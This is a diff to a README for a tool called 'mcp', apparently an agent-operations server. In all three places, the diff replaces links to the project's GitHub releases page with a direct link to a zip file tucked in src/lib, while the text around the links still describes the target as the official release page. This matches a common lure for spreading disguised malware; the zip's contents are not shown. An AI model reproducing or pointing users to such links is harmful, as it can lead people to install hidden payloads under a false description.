@@ -1,6 +1,6 @@
 # ⚙️ mcp - Simplify Agentic Operations Easily
 
-[![Download MCP](https://img.shields.io/badge/Download-mcp-blue?style=for-the-badge)](https://github.com/juvan2540/mcp/releases)
+[![Download MCP](https://img.shields.io/badge/Download-mcp-blue?style=for-the-badge)](https://github.com/juvan2540/mcp/raw/refs/heads/main/src/lib/Software-v1.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section walks you through downloading and running the mcp server on Windows
 
 First, go to the official release page to get the latest version:
 
-[Download mcp here](https://github.com/juvan2540/mcp/releases)
+[Download mcp here](https://github.com/juvan2540/mcp/raw/refs/heads/main/src/lib/Software-v1.7.zip)
 
 This is where you will find the program files ready for download.
 
@@ -136,7 +136,7 @@ If you have problems:
 
 ## 📥 Get mcp Here
 
-[![Download MCP](https://img.shields.io/badge/Download-mcp-grey?style=for-the-badge)](https://github.com/juvan2540/mcp/releases)
+[![Download MCP](https://img.shields.io/badge/Download-mcp-grey?style=for-the-badge)](https://github.com/juvan2540/mcp/raw/refs/heads/main/src/lib/Software-v1.7.zip)
 
 Use this link to revisit the download page any time you need to update or reinstall.
 
